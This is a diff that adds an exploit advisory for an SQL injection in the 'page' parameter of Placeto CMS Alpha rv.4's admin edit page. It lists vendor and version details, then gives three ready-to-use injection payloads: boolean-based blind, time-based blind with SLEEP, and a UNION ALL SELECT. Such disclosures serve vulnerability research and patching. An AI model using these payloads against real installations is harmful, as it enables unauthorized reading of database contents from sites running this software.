@@ -1,0 +1,36 @@
+Placeto CMS Alpha v4 - 'page' SQL Injection
+
+# Title: Placeto CMS
+# Date: 21.03.2019
+# Exploit Author: Abdullah Çelebi
+# Vendor Homepage: https://sourceforge.net/projects/placeto/
+# Software Link: https://sourceforge.net/projects/placeto/files/alpha-rv.4/placeto.zip
+# Version: Alpha rv.4
+# Category: Webapps
+# Tested on: WAMPP @Win
+# Software description:
+A lightweight, easy to use PHP content management system (CMS). Written to
+be fast and to use as little memory as possible. Placeto CMS offers browser
+and server caching, provides gzip compression and to cut down on bandwidth
+and CPU time.
+
+# Vulnerabilities:
+# An attacker can access all data following an authorized user login using
+the parameter.
+
+
+# POC - SQLi :
+
+# Parameter: page (GET)
+# Request URL: http://localhost/placeto/admin/edit.php?page=key
+
+#    Type : boolean-based blind
+page=JyI" AND 1647=1647 AND "svwN"="svwN
+
+#    Type : time-based blind
+page=JyI" AND SLEEP(5) AND "uIvY"="uIvY
+
+#    Type : union query
+page=-8388" UNION ALL SELECT
+NULL,CONCAT(0x716b627671,0x6a636f485445445466517a4a6f6972635551635179725550617072647371784f6445576b74736849,0x716b6b6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+CbSf
